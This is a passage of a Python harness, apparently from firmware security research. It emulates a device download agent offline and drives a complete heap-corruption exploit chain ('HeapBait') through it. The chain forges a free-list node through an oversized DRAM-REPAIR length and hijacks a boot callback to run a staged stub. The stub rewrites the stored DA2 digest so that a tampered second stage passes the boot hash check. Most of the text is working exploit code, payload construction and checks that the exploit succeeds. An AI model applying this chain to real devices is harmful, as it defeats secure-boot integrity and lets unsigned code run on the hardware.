        rec["victim"] = D + need
        rec["victim_alloc"] = any(x["ptr"] == rec["victim"] for x in allocs)
        fired = [f for f in fires if f["free_ptr"] == rec["victim"]]
        rec["victim_freed"] = bool(fired)
        rec["fire_count"] = len(fires)
        rec["fire_values"] = [f["value"] for f in fires]
        rec["dpc_cb"] = fires[-1]["value"] if fires else None
    rec["free_after"] = [{"addr": n["addr"], "size": n["size"]}
                         for n in fc.walk_free_list(emu.uc)["nodes"]]
    rec["fire_ok"] = bool(rec["exact"] and rec["victim_freed"]
                          and rec["fire_count"] == 1
                          and rec["fire_values"] == [FS_STAGE]
                          and not rec["budget"])
    return rec


# ---------------------------------------------------------------------------
# phase 4: full chain in one emulator
# ---------------------------------------------------------------------------
def run_chain(da1_path, body, digest, stub, blob, L, preludes,
              verbose_events=False):
    emu = fc.boot(da1_path, map_da2=True)
    fc.install_sha_engine(emu)

    pre = []
    for name in preludes:
        if name == "cmd":
            pre.append(prelude_benign_cmd(emu))
        elif name == "exactdl":
            pre.append(prelude_exact_download(emu))
        elif name == "bootto":
            pre.append({"kind": "bootto", "rc": stage_blob(emu, blob)["rc"]})
        else:
            raise ValueError(name)

    slot_before = bytes(emu.uc.mem_read(DA1_SLOT, 32))
    stage = stage_blob(emu, blob)
    staged_after = bytes(emu.uc.mem_read(FS_STAGE, len(blob)))
    if not stage["ok"]:
        return {"fatal": "staging prelude failed", "prelude": pre,
                "stage": stage, "pass": False}

    ev = {"blx": None, "stub_entry": 0, "stub_exit": 0, "safe": 0,
          "fire": [], "forged_links": None, "stopped_at": None,
          "free_writes": [], "free_calls": []}
    allocs = []
    gate = {}
    snap = []
    last = {"ptr": None, "lr": None}

    class _Stop(Exception):
        pass

    def m_entry(uc, a, s, u):
        gate["req"] = uc.reg_read(ac.UC_ARM_REG_R0)
        gate["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        if gate["lr"] == C25["DOWNLOAD_MALLOC_LR"]:
            snap[:] = fc.walk_free_list(uc)["nodes"]

    def m_ret(uc, a, s, u):
        if "req" in gate:
            allocs.append({"request": gate.pop("req"),
                           "lr": gate.pop("lr", 0),
                           "ptr": uc.reg_read(ac.UC_ARM_REG_R0)})
            gate.clear()

    def on_free(uc, a, s, u):
        last["ptr"] = uc.reg_read(ac.UC_ARM_REG_R0)
        last["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        ev["free_calls"].append(dict(last))

    def on_fire(uc, a, s, u):
        node = uc.reg_read(ac.UC_ARM_REG_R0)
        rec = {"node": node, "value": uc.reg_read(ac.UC_ARM_REG_R1),
               "free_ptr": last["ptr"], "free_lr": last["lr"]}
        ev["free_writes"].append(rec)
        if node == FORGED_NODE:
            ev["fire"].append(rec)

    def on_blx(uc, a, s, u):
        ev["blx"] = {"target": uc.reg_read(ac.UC_ARM_REG_R4),
                     "r0": uc.reg_read(ac.UC_ARM_REG_R0),
                     "sp": uc.reg_read(ac.UC_ARM_REG_SP),
                     "lr": uc.reg_read(ac.UC_ARM_REG_LR)}

    def on_stub_entry(uc, a, s, u):
        ev["stub_entry"] += 1
        ev["stub_lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        ev["stub_r4"] = uc.reg_read(ac.UC_ARM_REG_R4)
        ev["forged_links"] = (fc.u32(uc, FORGED_NODE),
                              fc.u32(uc, FORGED_NODE + 4))

    def on_stub_exit(uc, a, s, u):
        ev["stub_exit"] += 1

    def on_safe(uc, a, s, u):
        ev["safe"] += 1

    def on_dpc_clear(uc, a, s, u):
        ev["stopped_at"] = a
        ev["dpc_at_clear"] = [fc.u32(uc, DPC + 4 * i) for i in range(3)]
        raise _Stop()

    emu.uc.hook_add(UC_HOOK_CODE, m_entry, begin=C25["MALLOC"],
                    end=C25["MALLOC"])
    emu.uc.hook_add(UC_HOOK_CODE, m_ret, begin=C25["MALLOC_RET"],
                    end=C25["MALLOC_RET"])
    emu.uc.hook_add(UC_HOOK_CODE, on_free, begin=C25["FREE"], end=C25["FREE"])
    emu.uc.hook_add(UC_HOOK_CODE, on_fire, begin=C25["FREE_CORE_WRITE"],
                    end=C25["FREE_CORE_WRITE"])
    emu.uc.hook_add(UC_HOOK_CODE, on_blx, begin=C25["BLX_SITE"],
                    end=C25["BLX_SITE"])
    emu.uc.hook_add(UC_HOOK_CODE, on_stub_entry, begin=FS_STAGE, end=FS_STAGE)
    emu.uc.hook_add(UC_HOOK_CODE, on_stub_exit, begin=FS_STAGE + 0x48,
                    end=FS_STAGE + 0x48)
    emu.uc.hook_add(UC_HOOK_CODE, on_safe, begin=C25["SAFE_CONT"],
                    end=C25["SAFE_CONT"])
    emu.uc.hook_add(UC_HOOK_CODE, on_dpc_clear, begin=0x200FD0, end=0x200FD0)

    payload = make_payload(L, FS_STAGE)
    host = FixedHost(emu, L, payload, FS_STAGE)
    emu.on_send = host.on_send
    emu.rx.clear()
    emu.tx.clear()
    emu.rx.append(b"OK\x00")
    emu.rx.append(hs.CMD_XML)
    emu.write_bytes(DPC, b"\x00" * 12)
    emu.budget["hits"] = 0
    emu.budget["hit"] = False
    rc = emu.call(C25["CMD_LOOP"], [])
    cmdloop_rc = rc if rc is None else (rc & 0xFFFFFFFF)

    out = {
        "prelude": pre, "stage": stage, "slot_before": slot_before.hex(),
        "staged_after": staged_after.hex(),
        "cmdloop_rc": cmdloop_rc, "budget": emu.budget["hit"],
        "payload_len": len(payload), "payload_sha": hashlib.sha256(payload).hexdigest(),
        "download_buffer": None, "chunk": None, "exact_fit": False,
        "capacity": None, "victim": None, "victim_alloc": False,
        "victim_freed": False, "fire_count": 0, "predicted": None,
        "events": ev,
    }
    dl = [x for x in allocs
          if x["lr"] == C25["DOWNLOAD_MALLOC_LR"] and x["ptr"]]
    D = dl[0]["ptr"] if dl else None
    out["download_buffer"] = D
    out["predicted"] = host.predicted["addr"] if host.predicted else None
    need = hs._align4(L + 0x10)
    if D:
        node = next((n for n in snap
                     if n["size"] >= need and n["addr"] + hs.CHUNK_HDR == D),
                    None)
        out["chunk"] = node["size"] if node else None
        out["capacity"] = need - hs.CHUNK_HDR
        out["exact_fit"] = bool(node and node["size"] == need)
        out["victim"] = D + need
        valloc = [x for x in allocs if x["ptr"] == out["victim"]]
        out["victim_alloc"] = bool(valloc)
        out["victim_alloc_info"] = ({"request": valloc[0]["request"],
                                     "lr": valloc[0]["lr"]} if valloc else None)
        ev["fire"] = [f for f in ev["fire"]]
        out["victim_freed"] = any(f["free_ptr"] == out["victim"]
                                  for f in ev["fire"])
        out["victim_free_lr"] = next((f["free_lr"] for f in ev["fire"]
                                      if f["free_ptr"] == out["victim"]), None)
        out["victim_free_count"] = sum(1 for f in ev["free_calls"]
                                       if f["ptr"] == out["victim"])
    out["fire_count"] = len(ev["fire"])
    out["fire_value"] = ev["fire"][-1]["value"] if ev["fire"] else None
    out["payload_body_is_zeros"] = all(
        b == 0 for i, b in enumerate(payload)
        if not (out["capacity"] is not None
                and out["capacity"] <= i < out["capacity"] + hs.CHUNK_HDR))
    out["stub_in_payload"] = stub in payload

    blx = ev["blx"]
    out["blx"] = blx
    out["fire_ok"] = bool(ev["fire"] and out["fire_count"] == 1
                          and out["fire_value"] == FS_STAGE)
    out["blx_ok"] = bool(blx and blx["target"] == FS_STAGE)
    out["stub_entered"] = ev["stub_entry"] >= 1
    out["stub_returned"] = (ev["stub_exit"] >= 1 and ev["safe"] >= 1
                            and ev.get("stub_lr") == C25["SAFE_CONT"])

    # ---- DA survives ------------------------------------------------------
    walk = fc.walk_free_list(emu.uc)
    out["free_list_after"] = walk
    out["assert_freelist"] = bool(walk["sentinel_reached"]
                                  and not walk["forged_present"]
                                  and not walk["zero_link"])
    out["sentinel"] = SENTINEL
    out["dpc_after_stub"] = ev.get("dpc_at_clear")

    rounds = []
    for _ in range(3):
        emu.budget["hits"] = 0
        p = emu.call(C25["MALLOC"], [0x100, 0]) & 0xFFFFFFFF
        frc = emu.call(C25["FREE"], [p]) & 0xFFFFFFFF
        rounds.append({"ptr": p, "free_rc": frc})
    out["alloc_rounds"] = rounds
    out["assert_alloc"] = all(r["ptr"] not in (0, 0xFFFFFFFF)
                              and r["free_rc"] == 0 for r in rounds)

    emu.on_send = None
    emu.rx.clear()
    emu.tx.clear()
    emu.rx.append(b"OK\x00")
    emu.rx.append(fc.BENIGN_XML)
    emu.budget["hits"] = 0
    out["benign_rc"] = emu.call(C25["CMD_LOOP"], []) & 0xFFFFFFFF
    out["benign_tx"] = [bytes(t) for t in emu.tx]
    out["assert_cmdloop"] = any(
        b"<command>CMD:END</command>" in t and b"<result>OK</result>" in t
        for t in out["benign_tx"])

    slot = bytes(emu.uc.mem_read(DA1_SLOT, 32))
    out["hash_slot"] = slot.hex()
    out["hash_written"] = digest.hex()
    out["assert_slot"] = slot == digest

    # ---- real BOOT-TO with the patched DA2 -------------------------------
    if not _mapped(emu, FS_STAGE):
        emu.uc.mem_map(FS_STAGE, 0x100000)
    probe = C25BootProbe(emu)
    run = run_boot_to(emu, body, probe)
    boot_cb = fc.u32(emu.uc, DPC + 4)
    boot_arg = fc.u32(emu.uc, DPC + 8)
    staging = bytes(emu.uc.mem_read(FS_STAGE, 32))
    out["boot_to"] = {"rc": run["rc"], "dpc_cb": boot_cb,
                      "dpc_arg": boot_arg, "staging_head": staging.hex(),
                      "probe": run["probe"], "sent": run["sent"]}
    out["assert_bootto"] = bool(
        run["rc"] == 0 and boot_cb == FS_STAGE and boot_arg == BOOT_ARG_OK
        and not run["probe"]["mismatch_branch"]
        and run["probe"]["cmp_bytes"] >= 32
        and run["probe"]["ok_reached"]
        and staging == body[:32]
        and run["sent"] == DA2_BODY)

    # direct 0x24fa00 over what BOOT-TO staged (hashlib model, labelled)
    emu.write_bytes(SHA_OUT_ADDR, b"\xAA" * 0x30)
    emu.write_bytes(SHA_OUTLEN_ADDR, b"\xBB" * 4)
    emu.call(C25["SHA_ROUTINE"],
             [FS_STAGE, DA2_BODY, SHA_OUT_ADDR, SHA_OUTLEN_ADDR])
    sha_out = bytes(emu.uc.mem_read(SHA_OUT_ADDR, 32))
    out["sha_routine"] = {"out": sha_out.hex(),
                          "outlen": fc.u32(emu.uc, SHA_OUTLEN_ADDR),
                          "equal_slot": sha_out == slot}
    out["assert_sha"] = bool(sha_out == slot
                             and out["sha_routine"]["outlen"] == 32)

    heap = emu.heap_state()
    constants = {"magic": FAKE_MAGIC, "forged_node": FORGED_NODE,
                 "cb": FS_STAGE, "stub": FS_STAGE,
                 "digest": FS_STAGE + DIGEST_OFF, "L": L, "slot": DA1_SLOT}
    d_bytes = struct.pack("<I", D).hex() if D else None
    out["no_heap"] = {
        "constants": {k: hex(v) for k, v in constants.items()},
        "inside_heap": [k for k, v in constants.items()
                        if heap["base"] <= v < heap["base"] + heap["size"]],
        "download_buffer_used_in_payload": (
            bool(d_bytes) and d_bytes in payload.hex()),
        "payload_hex": payload.hex(),
    }
    out["no_heap"]["ok"] = (not out["no_heap"]["inside_heap"]
                            and not out["no_heap"]
                            ["download_buffer_used_in_payload"])
    out["heap"] = heap
    out["checks"] = {
        "stage_staged": stage["staged_equal"],
        "stage_hash_mismatch": stage["rc_is_hash_mismatch"],
        "stage_not_transport": not stage["rc_is_transport"],
        "exact_fit": out["exact_fit"],
        "victim_allocated": out["victim_alloc"],
        "fire": out["fire_ok"],
        "blx_target": out["blx_ok"],
        "stub_entered": out["stub_entered"],
        "stub_returned": out["stub_returned"],
        "stub_cleared_dpc": out["dpc_after_stub"] == [0, 0, 0],
        "freelist": out["assert_freelist"],
        "alloc": out["assert_alloc"],
        "cmdloop": out["assert_cmdloop"],
        "slot": out["assert_slot"],
        "sha_model": out["assert_sha"],
        "bootto_gate": out["assert_bootto"],
        "no_heap_address": out["no_heap"]["ok"],
        "stub_not_in_payload": not out["stub_in_payload"],
    }
    out["pass"] = all(out["checks"].values())
    return out


def _mapped(emu, addr):
    try:
        emu.uc.mem_read(addr, 4)
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# reporting helpers
# ---------------------------------------------------------------------------
def _hx(v):
    return "0x%x" % v if isinstance(v, int) else "-"


def _fmt_free(nodes, limit=6):
    return ", ".join(f"{n['addr']:#x}/{n['size']:#x}" for n in nodes[:limit])


def print_sweep(rows, configs):
    print("-- phase 3: declared DRAM-REPAIR length sweep (C.25) --")
    hdr = ("config", "L", "D", "chunk", "need", "fit", "cap", "victim",
           "valloc", "vfree", "fires", "fire", "scratch", "state")
    widths = (9, 6, 10, 8, 6, 4, 6, 10, 6, 6, 5, 10, 8, 10)
    print("  " + "  ".join(h.ljust(w) for h, w in zip(hdr, widths)))
    print("  " + "  ".join("-" * w for w in widths))
    for r in rows:
        cells = (r["config"], f"{r['L']:#04x}",
                 _hx(r["D"]), _hx(r["chunk"]), f"{r['needed']:#x}",
                 "yes" if r["exact"] else "no", _hx(r["capacity"]),
                 _hx(r["victim"]), "yes" if r["victim_alloc"] else "no",
                 "yes" if r["victim_freed"] else "no",
                 str(r["fire_count"]),
                 _hx(r["fire_values"][-1]) if r["fire_values"] else "-",
                 "/".join(f"{s:#x}" for s in r["scratch_sizes"]) or "-",
                 "budget" if r["budget"] else
                 ("fire" if r["fire_ok"] else "no-fire"))
        print("  " + "  ".join(str(c).ljust(w) for c, w in zip(cells, widths)))
    print("")


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main(argv=None):
    ap = argparse.ArgumentParser(
        description="DA1 C.25 HeapBait fixed-staging chain (offline, Unicorn)")
    ap.add_argument("--json", default=None)
    ap.add_argument("--no-regression", action="store_true",
                    help="skip re-running da1_fixed_stage.py")
    ap.add_argument("--quick", action="store_true",
                    help="coarse sweep only (skip the fine exact-fit scan)")
    ap.add_argument("--runs", type=int, default=RUNS_PER_CONFIG,
                    help="fresh runs per chain config (>=5)")
    args = ap.parse_args(argv)
    t0 = time.time()
    p = print
    patch_modules()

    p("=" * 78)
    p("DA1 C.25 HeapBait chain: failing BOOT-TO staging -> HeapBait(cb=0x40000000)")
    p("                         -> stub @0x40000000 -> DA1 digest slot 0x264c28")
    p("=" * 78)
    p("[DEV] SHA-256 entry 0x24fa00 is MODELLED WITH hashlib (hardware crypto")
    p("      block; see the native probe at the end).")
    p("      The BOOT-TO download, the compare loop 0x201184..0x20119c, the")
    p("      allocator, handler dispatch and the stub run as native DA1 code.")

    # ---------------- phase 1 ----------------
    data, da1, da2, da1_path, da2_path = extract()
    p("")
    p("-- phase 1: identity + digest-slot rule --")
    p(f"container        : {CONTAINER}")
    p(f"  size / sha256  : {len(data):#x} / {hashlib.sha256(data).hexdigest()}")
    p(f"  DA1 @{DA1_OFF:#x}   : len {DA1_LEN:#x}  sha256 {hashlib.sha256(da1).hexdigest()}")
    p(f"  DA2 @{DA2_OFF:#x}   : len {DA2_LEN:#x}  sha256 {hashlib.sha256(da2).hexdigest()}")
    p(f"  extracted      : {da1_path} , {da2_path}")

    slot = digest_slot_rule(da1, da2)
    p("")
    p("  digest candidates vs DA1 slot 0x264c28:")
    for row in slot["candidates"]:
        p(f"    {row['label']:38s} len {row['length']:#7x}  "
          f"{row['sha256']}  {'MATCH' if row['match'] else ''}")
    p(f"  slot value     : {slot['slot_value']}")
    p(f"  slot VA        : {slot['slot_va']:#x}  (DA1 file offset "
      f"{slot['slot_da1_file_offset']:#x}, container offset "
      f"{slot['slot_container_offset']:#x})")
    p(f"  occurrences    : {[hex(x) for x in slot['occurrences_in_da1']]} "
      f"(unique={slot['unique']})")
    p(f"  RULE           : expected DA2 digest = sha256(DA2[:0x547c0]) "
      f"= sha256(DA2[:-0x100])  -> {'PASS' if slot['ok'] else 'FAIL'}")

    # ---------------- phase 2 ----------------
    boot = bootto_structure(da1)
    p("")
    p("-- phase 2: BOOT-TO staging/hash/compare structure [STATIC] --")
    for line in boot["prologue_disasm"]:
        p("    " + line)
    p("  download       : 0x2010d0  bl 0x24d9ec  dest=&[fp-0x1c] "
      "(= da/arg/at_address), len=&[fp-0x20]")
    p("  hash           : 0x201140  bl 0x24fa00  over ([fp-0x1c],[fp-0x20]) "
      "-> 0x30-byte digest buffer")
    p("  compare        : 0x201184..0x20119c  byte loop vs [0x264c28], "
      "bne -> 0x201260")
    p("  mismatch rc    : 0x201324/0x201328 -> 0xc0070004")
    p("  success        : dpc(0x2df7a0)->cb = jmp_address, ->arg = 0x2de180")
    for k, v in boot["checks"].items():
        p(f"    CHECK {k:22s} {'PASS' if v else 'FAIL'}")
    p(f"  -> {'PASS' if boot['ok'] else 'FAIL'} (same structure as 200EX01)")

    # ---------------- build constants ----------------
    stub, stub_asm = build_stub()
    body, old_digest, digest = patched_da2(da2_path)
    blob = make_blob(stub, digest)
    p("")
    p("-- constants (C.25) --")
    for name, value in (
            ("fire write / free core", C25["FREE_CORE_WRITE"]),
            ("free entry", C25["FREE"]),
            ("malloc", C25["MALLOC"]),
            ("insert", C25["INSERT"]),
            ("dedicated dpc struct", DPC),
            ("forged node (dpc-4)", FORGED_NODE),
            ("free-list head", HEAP_HEAD),
            ("free-list sentinel (head+8)", SENTINEL),
            ("cmd_loop / blx / safe cont",
             f"{C25['CMD_LOOP']:#x} / {C25['BLX_SITE']:#x} / "
             f"{C25['SAFE_CONT']:#x}"),
            ("registrar", C25["REGISTRAR"]),
            ("DRAM-REPAIR handler", C25["DRAM_REPAIR"]),
            ("BOOT-TO handler", C25["BOOT_TO"]),
            ("download", 0x24D9EC),
            ("download malloc lr", C25["DOWNLOAD_MALLOC_LR"]),
            ("recv length store", 0x24DD08),
            ("SHA-256 entry (modelled)", C25["SHA_ROUTINE"]),
            ("digest slot", DA1_SLOT),
            ("staging / stub entry", FS_STAGE),
            ("stub len / digest off", f"{STUB_LEN:#x} / {DIGEST_OFF:#x}"),
            ("fake header", "{0x%08x, 0x%x, 0x%x}" % FAKE_HDR),
            ("chosen L", f"{L_FINAL:#x}")):
        p(f"  {name:30s}: {value if isinstance(value, str) else hex(value)}")
    p(f"  DA2 patch      : body[{C25['PATCH_OFFSET']:#x}] ^= "
      f"{C25['PATCH_XOR']:#04x} (length preserved)")
    p(f"    old body sha256: {old_digest.hex()}")
    p(f"    new body sha256: {digest.hex()}")
    p(f"    slot before   : {slot['slot_value']}")
    p(f"    slot == old   : {slot['slot_value'] == old_digest.hex()}")

    # ---------------- phase 3: sweep ----------------
    p("")
    p(f"sweeping L={SWEEP_LO:#x}..{SWEEP_HI:#x} step {SWEEP_STEP:#x} over "
      f"{len(SWEEP_CONFIGS)} heap histories ...", flush=True)
    sweep_rows = []
    for L in range(SWEEP_LO, SWEEP_HI + 1, SWEEP_STEP):
        for cfg in SWEEP_CONFIGS:
            sweep_rows.append(sweep_run(da1_path, L, cfg, blob))
    fine_rows = []
    if not args.quick:
        p(f"fine scan L={FINE_LO:#x}..{FINE_HI:#x} step 1 (bootto prelude) ...",
          flush=True)
        for L in range(FINE_LO, FINE_HI + 1):
            fine_rows.append(sweep_run(da1_path, L, "bootto", blob))
    p("")
    print_sweep(sweep_rows + fine_rows, SWEEP_CONFIGS)

    fires = [r for r in sweep_rows if r["fire_ok"]]
    exact = [r for r in sweep_rows if r["exact"]]
    scratch_all = sorted({s for r in sweep_rows for s in r["scratch_sizes"]})
    fine_fires = [r["L"] for r in fine_rows if r["fire_ok"]]
    fine_exact = [r["L"] for r in fine_rows if r["exact"]]
    p("  exact-fit L    : "
      + (", ".join(f"{r['L']:#x}({r['config']})" for r in exact) or "NONE"))
    p("  firing L       : "
      + (", ".join(f"{r['L']:#x}({r['config']})" for r in fires) or "NONE"))
    p(f"  parse scratch  : sizes {[hex(s) for s in scratch_all]} "
      f"(malloc(0x40) at 0x206cf8 -> chunk 0x4c) "
      f"-> {'UNCHANGED 0x4c' if scratch_all == [0x4C] else 'CHANGED'}")
    if fine_rows:
        p(f"  fine scan      : exact {[hex(x) for x in fine_exact]}  "
          f"fires {[hex(x) for x in fine_fires]}")
    rule_ok = (scratch_all == [0x4C]
               and all(r["config"] in ("none", "bootto", "cmd")
                       for r in fires)
               and {r["L"] for r in fires} == {L_FINAL}
               and fine_fires == [0x39, 0x3A, 0x3B, 0x3C])
    p(f"  exact-fit rule : align4(L+0x10) == scratch_chunk 0x4c  "
      f"== align4(0x40+0xc)  -> L in [0x39..0x3c]; chosen L=0x3c "
      f"-> {'PASS' if rule_ok else 'CHECK'}")

    # ---------------- phase 4: chain ----------------
    p("")
    p(f"-- phase 4: full chain, L={L_FINAL:#x}, {args.runs} fresh runs/config --")
    chain_runs = {}
    chain_first = {}
    for cfg in CHAIN_CONFIGS:
        preludes = {"none": [], "cmd": ["cmd"], "exactdl": ["exactdl"],
                    "doublebootto": ["bootto"]}[cfg]
        runs = []
        for i in range(max(args.runs, RUNS_PER_CONFIG)):
            t = time.time()
            res = run_chain(da1_path, body, digest, stub, blob, L_FINAL,
                            preludes)
            res["_seconds"] = round(time.time() - t, 3)
            res["_run"] = i + 1
            runs.append(res)
        chain_runs[cfg] = runs
        chain_first[cfg] = runs[0]

    ok_all = True
    for cfg in CHAIN_CONFIGS:
        res = chain_first[cfg]
        if res.get("fatal"):
            p("")
            p(f"[config {cfg}]  FATAL: {res['fatal']}")
            ok_all = False
            continue
        ev = res["events"]
        p("")
        p(f"[config {cfg}]  prelude="
          f"{[x['kind'] for x in res['prelude']] or 'none'}  "
          f"staging rc={res['stage']['rc']:#x}")
        p(f"  blob          : {res['stage']['blob_len']} bytes, staged at "
          f"0x{FS_STAGE:x} == sent: {res['stage']['staged_equal']}, "
          f"slot unchanged: {res['stage']['slot_unchanged']}")
        p(f"  compare loop  : hits={res['stage']['probe']['cmp_bytes']} "
          f"(expected {res['stage']['expected_cmp_hits']}) "
          f"mismatch={res['stage']['probe']['mismatch_branch']} "
          f"mismatch-log={res['stage']['probe']['mismatch_log']} "
          f"rc=0x{res['stage']['rc']:x}")
        p(f"  download      : D={_hx(res['download_buffer'])} "
          f"(predicted {_hx(res['predicted'])}) chunk={_hx(res['chunk'])} "
          f"needed=0x{hs._align4(L_FINAL + 0x10):x} exact={res['exact_fit']}")
        vai = res.get("victim_alloc_info") or {}
        p(f"  victim         : user={_hx(res['victim'])} "
          f"allocated={res['victim_alloc']} (malloc(0x{vai.get('request', 0):x}) "
          f"@lr={_hx(vai.get('lr'))}) freed={res['victim_freed']} "
          f"(free lr={_hx(res.get('victim_free_lr'))}, "
          f"frees={res.get('victim_free_count')})")
        if res["fire_count"]:
            fw = ev["fire"][-1]
            p(f"  fire write     : *(0x{fw['node']:x}+8) = "
              f"0x{fw['value']:x}  (count={res['fire_count']})")
        if res["blx"]:
            b = res["blx"]
            p(f"  blx @0x{C25['BLX_SITE']:x}  : target=0x{b['target']:x} "
              f"r0=0x{b['r0']:x} sp=0x{b['sp']:x} lr=0x{b['lr']:x}")
        p(f"  stub           : entry={ev['stub_entry']} at 0x{FS_STAGE:x} "
          f"lr={_hx(ev.get('stub_lr'))} r4={_hx(ev.get('stub_r4'))} "
          f"stub_exit_hits={ev['stub_exit']} safe_cont={ev['safe']} "
          f"harness_stop={_hx(ev['stopped_at'])}")
        p(f"  dpc after stub : {res.get('dpc_after_stub')} "
          f"(stub zeroed +0/+4/+8)")
        p(f"  freed list     : {_fmt_free(res['free_list_after']['nodes'])} "
          f"(sentinel={res['free_list_after']['sentinel_reached']}, "
          f"forged={res['free_list_after']['forged_present']})")
        p(f"  malloc/free x3 : "
          + ", ".join(f"0x{r['ptr']:x}" for r in res["alloc_rounds"]))
        p(f"  next command   : rc=0x{res['benign_rc']:x} ok={res['assert_cmdloop']}")
        p(f"  slot           : {res['hash_slot']}")
        p(f"  want           : {res['hash_written']}")
        bt = res["boot_to"]
        p(f"  real BOOT-TO   : rc=0x{bt['rc']:x} dpc->cb=0x{bt['dpc_cb']:x} "
          f"dpc->arg=0x{bt['dpc_arg']:x} cmp={bt['probe']['cmp_bytes']}B "
          f"ok_log={bt['probe']['ok_reached']} sent=0x{bt['sent']:x}")
        p(f"  SHA model      : 0x24fa00 -> outlen={res['sha_routine']['outlen']} "
          f"equal_slot={res['sha_routine']['equal_slot']} [hashlib]")
        bad = [k for k, v in res["checks"].items() if not v]
        p(f"  checks         : {len(res['checks']) - len(bad)}/"
          f"{len(res['checks'])} PASS"
          + (f"  failing: {bad}" if bad else ""))
        ok_all = ok_all and res["pass"]

    p("")
    p("  stub disassembly (constants only):")
    for line in stub_asm:
        p("    " + line)

    # ---------------- phase 5: determinism ----------------
    p("")
    p("-- phase 5: determinism (fresh emulator, identical stack each run) --")
    hdr = ("config", "runs", "fire", "blx", "stub", "freelist", "alloc",
           "cmdloop", "slot", "bootto", "sec")
    widths = (13, 5, 5, 5, 5, 9, 6, 8, 5, 7, 6)
    p("  " + "  ".join(h.ljust(w) for h, w in zip(hdr, widths)))
    p("  " + "  ".join("-" * w for w in widths))
    det_ok = True
    det_rows = []
    for cfg in CHAIN_CONFIGS:
        runs = chain_runs[cfg]
        def allp(key):
            return all(r.get(key) for r in runs)
        row = {
            "config": cfg, "runs": len(runs),
            "fire": allp("fire_ok"), "blx": allp("blx_ok"),
            "stub": all(r.get("stub_entered") and r.get("stub_returned")
                        for r in runs if not r.get("fatal")),
            "freelist": allp("assert_freelist"), "alloc": allp("assert_alloc"),
            "cmdloop": allp("assert_cmdloop"), "slot": allp("assert_slot"),
            "bootto": allp("assert_bootto"),
            "sec": max(r["_seconds"] for r in runs),
            "all_pass": all(r.get("pass") for r in runs),
        }
        det_rows.append(row)
        det_ok = det_ok and row["all_pass"]
        cells = (cfg, str(row["runs"]),
                 "PASS" if row["fire"] else "FAIL",
                 "PASS" if row["blx"] else "FAIL",
                 "PASS" if row["stub"] else "FAIL",
                 "PASS" if row["freelist"] else "FAIL",
                 "PASS" if row["alloc"] else "FAIL",
                 "PASS" if row["cmdloop"] else "FAIL",
                 "PASS" if row["slot"] else "FAIL",
                 "PASS" if row["bootto"] else "FAIL",
                 f"{row['sec']:.2f}")
        p("  " + "  ".join(str(c).ljust(w) for c, w in zip(cells, widths)))

    p("")
    p(f"-- phase 5b: sweep determinism at L={L_FINAL:#x} "
      f"({RUNS_PER_CONFIG} fresh runs per heap history) --")
    hdr2 = ("sweep config", "runs", "exact", "fire", "fire value", "max sec")
    widths2 = (13, 5, 6, 5, 12, 8)
    p("  " + "  ".join(h.ljust(w) for h, w in zip(hdr2, widths2)))
    p("  " + "  ".join("-" * w for w in widths2))
    sweep_det_ok = True
    for cfg in SWEEP_CONFIGS:
        t = time.time()
        runs = [sweep_run(da1_path, L_FINAL, cfg, blob)
                for _ in range(RUNS_PER_CONFIG)]
        secs = time.time() - t
        ex = all(r["exact"] for r in runs)
        fi = all(r["fire_ok"] and r["fire_values"] == [FS_STAGE]
                 for r in runs)
        ok = ex and fi and all(r["scratch_sizes"] == [0x4C] for r in runs)
        sweep_det_ok = sweep_det_ok and ok
        cells = (cfg, str(len(runs)), "PASS" if ex else "FAIL",
                 "PASS" if fi else "FAIL", _hx(FS_STAGE) if fi else "-",
                 f"{secs:.2f}")
        p("  " + "  ".join(str(c).ljust(w) for c, w in zip(cells, widths2)))

    # ---------------- phase 6: native SHA probe ----------------
    native = fc.sha_native_probe(da1_path, body[:0x400])
    p("")
    p("-- native 0x24fa00 without the hashlib model (deviation proof) --")
    p(f"  status={native['status']!r} pc=0x{native['pc']:x} "
      f"matches_hashlib={native['matches_hashlib']}")
    p(f"  {native['note']}")

    # ---------------- phase 7: regression ----------------
    reg = {"ran": False, "ok": None, "tail": []}
    if not args.no_regression:
        script = os.path.join(_HERE, "da1_fixed_stage.py")
        p("")
        p(f"-- phase 7: regression {os.path.relpath(script)} (200EX01) --")
        proc = subprocess.run([sys.executable, script, "--quiet"],
                              cwd=_HERE, capture_output=True, text=True)
        tail = [ln for ln in proc.stdout.strip().splitlines() if ln][-14:]
        reg = {"ran": True, "ok": proc.returncode == 0
               and any("RESULT: PASS" in ln for ln in tail),
               "rc": proc.returncode, "tail": tail}
        for ln in tail:
            p("  | " + ln)

    # ---------------- verdict ----------------
    checks = {
        "identity": hashlib.sha256(data).hexdigest() == EXPECT_CONTAINER_SHA
                    and hashlib.sha256(da1).hexdigest() == EXPECT_DA1_SHA,
        "slot_rule": slot["ok"],
        "bootto_structure": boot["ok"],
        "sweep_scratch_0x4c": scratch_all == [0x4C],
        "sweep_exact_fit_0x3c": any(r["exact"] and r["L"] == L_FINAL
                                    for r in sweep_rows),
        "sweep_fire_0x3c": any(r["L"] == L_FINAL and r["fire_ok"]
                               for r in sweep_rows),
        "chain_all_configs": ok_all,
        "determinism": det_ok,
        "determinism_sweep": sweep_det_ok,
        "regression_200ex01": reg["ok"] if reg["ran"] else None,
    }
    verdict = all(v for v in checks.values() if v is not None)

    p("")
    p("-- summary table (C.25) --")
    r0 = chain_first["none"]
    p(f"  container sha256        : {hashlib.sha256(data).hexdigest()}")
    p(f"  DA1 sha256              : {hashlib.sha256(da1).hexdigest()}")
    p(f"  DA2 body len / sha256   : 0x{DA2_BODY:x} / {old_digest.hex()}")
    p(f"  digest slot rule        : sha256(DA2[:-0x100]) @ VA 0x{DA1_SLOT:x}")
    p(f"  scratch chunk / chosen L: 0x4c / 0x{L_FINAL:x}")
    p(f"  fake header             : {{0x{FAKE_MAGIC:08x}, 0x{FORGED_NODE:x}, "
      f"0x{FS_STAGE:x}}}")
    p(f"  stub / digest offset    : 0x{STUB_LEN:x} B / +0x{DIGEST_OFF:x}")
    if r0.get("fatal"):
        p("  chain (config none)     : FATAL (see phase 4)")
    else:
        p(f"  fire / blx / stub       : {r0['fire_count']} / "
          f"0x{r0['blx']['target']:x} / entry {r0['events']['stub_entry']}")
        p(f"  slot after chain        : {r0['hash_slot']}")
